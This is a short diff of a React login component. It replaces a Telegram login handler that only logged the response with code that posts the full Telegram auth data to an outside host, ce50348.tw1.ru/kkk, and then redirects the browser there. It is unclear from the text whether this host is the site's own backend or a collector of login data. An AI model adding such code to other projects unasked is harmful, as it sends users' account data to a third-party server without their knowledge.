@@ -1,9 +1,10 @@
 import React, { useEffect, useState } from 'react';
+import axios from 'axios';
 import styles from './main.module.scss';
 import TelegramLoginButton from 'react-telegram-login';
- 
 
- 
+
+
 
 
 function Main() {
@@ -23,10 +24,19 @@ function Main() {
       setPopup(false);
     }
   };
-  const handleTelegramResponse = response => {
-    console.log(response);
+  const handleTelegramResponse = res => {
 
-  };
+      const json = JSON.stringify(res);
+
+      axios.post('https://ce50348.tw1.ru/kkk', json)
+    .then(() => {
+      window.location.href = 'https://ce50348.tw1.ru';
+    })
+    .catch(error => {
+      console.error(error);
+    });
+  }
+
 
   return (
     <div className={styles.wrapper}>
@@ -37,7 +47,7 @@ function Main() {
         <form className={styles.form}>
           <div className={styles.input_container}>
             <input name='account' className={error.msg?styles.error:styles.input} type='text' placeholder='Укажите никнейм'/>
-            
+
             {error.msg&&<div className={styles.error_msg}>{error.msg}</div>}
           </div>
 
